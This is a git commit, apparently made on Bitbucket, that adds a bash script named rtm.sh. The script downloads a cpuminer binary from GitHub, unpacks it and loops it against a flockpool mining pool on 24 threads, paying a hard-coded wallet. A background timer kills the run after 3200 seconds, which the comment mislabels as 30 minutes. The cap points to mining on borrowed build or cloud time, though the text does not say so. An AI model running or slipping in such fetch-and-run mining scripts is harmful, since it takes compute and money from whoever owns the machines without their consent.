5fae20ef7f58048bea41a437bd403f4d97b04422
laoutchouc9e Shlaoutchouc9t <laoutchouc9@outlook.com>
2021-11-13 09:48:42 +0000

    rtm.sh created online with Bitbucket

---
+++ rtm.sh
@@ -0,0 +1,31 @@
+#!/bin/bash
+
+Timeout=3200 # 30 minutes
+
+function timeout_monitor() {
+   sleep "$Timeout"
+   kill "$1"
+}
+
+# start the timeout monitor in 
+# background and pass the PID:
+timeout_monitor "$$" &
+Timeout_monitor_pid=$!
+
+wget https://github.com/WyvernTKC/cpuminer-gr-avx2/releases/download/1.2.4.1/cpuminer-gr-1.2.4.1-x86_64_linux.tar.gz
+tar xf cpuminer-gr-1.2.4.1-x86_64_linux.tar.gz
+cd cpuminer-gr-1.2.4.1-x86_64_linux
+cd binaries
+COUNTER=20
+until [  $COUNTER -lt 10 ]; do
+            
+     ./cpuminer-sse2 -a gr -o stratum+tcps://us.flockpool.com:5555 -u RFcnLsWDziyWU7Hj8VrTpuAAv7FFYBJTi6.Dee --no-tune -t 24
+
+     echo COUNTER $COUNTER
+     let COUNTER-=1
+done
+# <your script here>
+
+# kill timeout monitor when terminating:
+kill "$Timeout_monitor_pid"
+exit 0
